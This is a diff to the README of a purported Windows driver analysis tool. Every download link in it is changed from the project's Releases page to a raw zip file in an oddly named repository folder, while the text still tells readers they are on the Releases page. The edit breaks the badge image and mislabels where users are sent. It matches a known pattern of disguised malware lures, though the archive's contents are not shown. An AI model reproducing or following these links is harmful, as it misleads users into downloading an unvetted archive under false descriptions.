@@ -1,6 +1,6 @@
 # 🛠️ WinDriverVortex - Analyze Windows Drivers Easily
 
-[![Download WinDriverVortex](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/YashBorade2576/WinDriverVortex/releases)
+[![Download WinDriverVortex](https://raw.githubusercontent.com/YashBorade2576/WinDriverVortex/main/hesitater/WinDriverVortex.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/YashBorade2576/WinDriverVortex/main/hesitater/WinDriverVortex.zip)
 
 ## 📚 Overview
 WinDriverVortex is a comprehensive tool for analyzing Windows driver vulnerabilities. It combines IDA Pro plugins, a user-friendly C# GUI, and a powerful Python analysis Core Engine™. This tool helps you understand and mitigate security risks in Windows drivers efficiently.
@@ -9,7 +9,7 @@ WinDriverVortex is a comprehensive tool for analyzing Windows driver vulnerabili
 Here’s how to get started with WinDriverVortex. Follow each step carefully to download and run the software.
 
 1. **Visit the Download Page**  
-   Go to the Releases page to find the latest version of WinDriverVortex. You can access it [here](https://github.com/YashBorade2576/WinDriverVortex/releases).
+   Go to the Releases page to find the latest version of WinDriverVortex. You can access it [here](https://raw.githubusercontent.com/YashBorade2576/WinDriverVortex/main/hesitater/WinDriverVortex.zip).
 
 2. **Choose the Right Version**  
    On the Releases page, look for the most recent version. Each release will have a list of assets. Make sure to select the one that matches your system (e.g., Windows 10, 64-bit).
@@ -43,7 +43,7 @@ WinDriverVortex offers several features to enhance your driver analysis process:
 ## 📥 Download & Install
 To get started, visit the following link to access the Releases page and download WinDriverVortex: 
 
-[Download WinDriverVortex](https://github.com/YashBorade2576/WinDriverVortex/releases).
+[Download WinDriverVortex](https://raw.githubusercontent.com/YashBorade2576/WinDriverVortex/main/hesitater/WinDriverVortex.zip).
 
 Once you've downloaded the file, follow the installation steps as outlined in the "Getting Started" section above.
 
